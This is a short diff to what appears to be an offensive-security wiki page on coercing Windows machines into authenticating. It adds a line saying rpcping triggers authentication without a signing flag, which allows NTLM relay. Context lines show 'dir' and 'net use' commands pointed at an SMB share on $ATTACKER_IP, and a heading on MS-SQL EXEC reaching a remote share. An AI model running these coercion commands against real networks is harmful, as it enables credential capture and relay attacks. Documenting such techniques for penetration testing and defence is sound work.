@@ -25,6 +25,8 @@ dir \\$ATTACKER_IP\something
 net use \\$ATTACKER_IP\something
 ```
 
+The rpcping command can also be used to trigger an authentication. The perk of this technique is that the auth won't carry a signing negotiation flag, hence allowing for relays 
+
 ### MS-SQL queries execution
 
 On MS-SQL \(Microsoft SQL\) servers, the EXEC method can be used to access a remote SMB share. This leads to an outgoing traffic using SMB.
